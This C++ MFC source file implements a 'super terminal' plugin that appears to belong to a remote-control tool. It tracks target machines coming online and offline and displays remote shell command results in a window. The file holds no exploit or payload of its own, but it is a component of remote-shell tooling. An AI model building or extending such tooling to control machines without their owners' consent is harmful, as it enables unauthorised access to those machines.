// TlntPlugin.cpp: implementation of the TlntPlugin class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "TlntPlugin.h"
#include "PluginDoc.h"
#include "FormCmd.h"
#include "CmdData.h"
#include "macro.h"

#ifdef _DEBUG
#undef THIS_FILE
static char THIS_FILE[]=__FILE__;
#define new DEBUG_NEW
#endif

STANDARDDATA  g_StData;
HINSTANCE	g_hInstance;

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

TlntPlugin::TlntPlugin()
{
	strcpy(m_plugInfo.sAuthor,_T("greatyao"));
	strcpy(m_plugInfo.sName,_T("超级终端"));
	strcpy(m_plugInfo.sDesc,_T("命令行功能"));
	m_plugInfo.uReserved = 0x0100;
}

TlntPlugin::~TlntPlugin()
{

}

void TlntPlugin:: OnCreateDocTemplate()
{
	m_docTemp = new CMultiDocTemplate(
		GetMinResId() + 1,
		RUNTIME_CLASS(PluginDoc),
		RUNTIME_CLASS(CMDIChildWnd),
		RUNTIME_CLASS(CFormCmd));
	ISite::AddDocTemplate(m_docTemp);
}


void TlntPlugin::OnCreateFrameMenu(CMenu* pMenu)
{
	pMenu->GetSubMenu(2)->AppendMenu(MF_STRING,GetMinResId() + 2, _T("超级终端"));
}

void TlntPlugin::OnCreateFrameToolBar(ToolBarData* pArr,UINT& count)
{
	pArr->uIconId = IDB_TLNT;
	pArr->uId = GetMinResId() + 2;
	strcpy(pArr->sName, "超级终端");
	strcpy(pArr->sTip, "执行控制台功能");

	count = 1;
}

void TlntPlugin::OnCommand(UINT uId)
{
	if (uId == GetMinResId() + 2)
	{
		ISite::CreateFrameWnd(m_docTemp,RUNTIME_CLASS(CFormCmd),_T("超级终端"));
		//ISite::Service(ZCM_GET_RUDP_HANDLE, NULL, NULL);
	}
}

void TlntPlugin::OnCreateDockPane(DockPane* pArr,UINT& count)
{	
	count = 0;
}

void TlntPlugin::OnNotify(UINT id, WPARAM wp, LPARAM lp)
{
	if(wp == NULL)	return;

	CFormCmd* pView = NULL;
	POSITION posdoc = m_docTemp->GetFirstDocPosition();
	if(posdoc)
	{
		CDocument* pdoc = m_docTemp->GetNextDoc(posdoc);
		POSITION posview = pdoc->GetFirstViewPosition();
		pView = (CFormCmd*)(pdoc->GetNextView(posview));
	}

	if(id == ZCM_SEL_OBJ)
	{
		STANDARDDATA* curData = (STANDARDDATA*)wp;
		memcpy(&g_StData, curData, sizeof(STANDARDDATA));
		CFormCmd::UpdateCmdView(g_StData.guid, pView);
	}
	else if(id == ZCM_WM_OFFLINE)	   
	{
		STANDARDDATA* pSD = (STANDARDDATA*)wp;
		if(strcmp(g_StData.guid, pSD->guid) == 0)
			g_StData.bOnlineFlag = false;
	}
	else if(id == ZCM_WM_MSG_ONLINE)
	{
		STANDARDDATA* curData = (STANDARDDATA*)wp;
		//第一台上线的目标机或者当前离线又上线的目标机
		if(strlen(g_StData.guid) == 0 || strcmp(curData->guid, g_StData.guid) == 0)
		{
			strcpy(g_StData.guid, curData->guid);
			memcpy(&g_StData, curData, sizeof(STANDARDDATA));
			g_StData.bOnlineFlag = true;
			CFormCmd::UpdateCmdView(g_StData.guid);
		}
	}
	else if(id == ZCM_RECV_MSG)
	{
		DispatchData* data = (DispatchData*)wp;
		control_header* header = data->recvData.header;
		char* body = (char*)data->recvData.body;
		if(pView && header->command == CONTROL_REQUEST_SHELL)
		{
			bool end = IS_PACKAGE_END(*header);
			pView->AddCmdResult(header->response, body, header->dataLen, end);
		}
	}
}

BOOL TlntPlugin::OnInitalize()
{
	return TRUE;
}

BOOL TlntPlugin::OnUninitalize()
{
	CFormCmd::FreeListData();
	return TRUE;
}

void TlntPlugin::OnCommandUI(CCmdUI* pCmdUI)
{

}